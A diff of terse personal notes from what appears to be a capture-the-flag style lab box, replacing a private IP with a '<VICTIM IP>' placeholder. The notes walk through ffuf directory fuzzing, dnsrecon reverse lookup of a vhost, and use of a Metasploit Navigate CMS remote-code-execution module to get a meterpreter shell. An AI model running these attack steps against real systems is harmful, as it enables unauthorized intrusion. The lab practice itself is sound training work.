@@ -1,14 +1,14 @@
 for port 80:
-	lets fuzz it: $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.50.111/FUZZ
+	lets fuzz it: $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<VICTIM IP>/FUZZ
 		returns secret -> says directory busting wont work... BUST. Moving on
 		
 
 		
 		
 for port 53:
-	lets do recon: $ dnsrecon -r 127.0.0.0/24 -n 192.168.50.111 -d blah (-d for domain - we dont know)
+	lets do recon: $ dnsrecon -r 127.0.0.0/24 -n <VICTIM IP> -d blah (-d for domain - we dont know)
 	returns: 
-			└─$ dnsrecon -r 127.0.0.0/24 -n 192.168.50.111 -d blah
+			└─$ dnsrecon -r 127.0.0.0/24 -n <VICTIM IP> -d blah
 			[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
 			[+]      PTR blackpearl.tcm 127.0.0.1
 			[+] 1 Records Found
@@ -18,7 +18,7 @@ for port 53:
 	lets fuzz this...
 		returns navigate -> navigate cms =>> has a lot of msfconsole hits on google (https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)
 		lets use msfconsole 
-			set rhosts 192.168.50.111
+			set rhosts <VICTIM IP>
 			set vhost blackpearl.tcm
 				meterpreter > shell
 				Process 686 created.
